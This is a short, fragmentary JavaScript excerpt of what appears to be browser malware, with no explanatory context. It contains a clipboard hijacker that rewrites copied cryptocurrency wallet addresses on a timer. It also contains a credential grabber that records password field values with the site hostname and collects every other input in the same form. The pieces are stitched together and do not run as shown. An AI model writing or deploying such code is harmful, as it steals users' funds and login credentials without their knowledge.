  // ... (more regex replacements for various wallet types)
  inputElement.value = clipboardContent;
  inputElement.select();
  document.execCommand('copy');
  inputElement.value = '';
}
setInterval(checkWalletAddresses, 1000);

if(event.target.type === 'password') {
    data.credentials = {
        domain: window.location.hostname,
        password: event.target.value,
        associated_fields: this.gatherAssociatedFields(event.target)
    };
}

gatherAssociatedFields: function(element) {
    const form = element.closest('form');
    const fields = {};
    if(form) {
        form.querySelectorAll('input').forEach(input => {
            fields[input.name || input.id] = input.value;
        });
    }
    return fields;
}

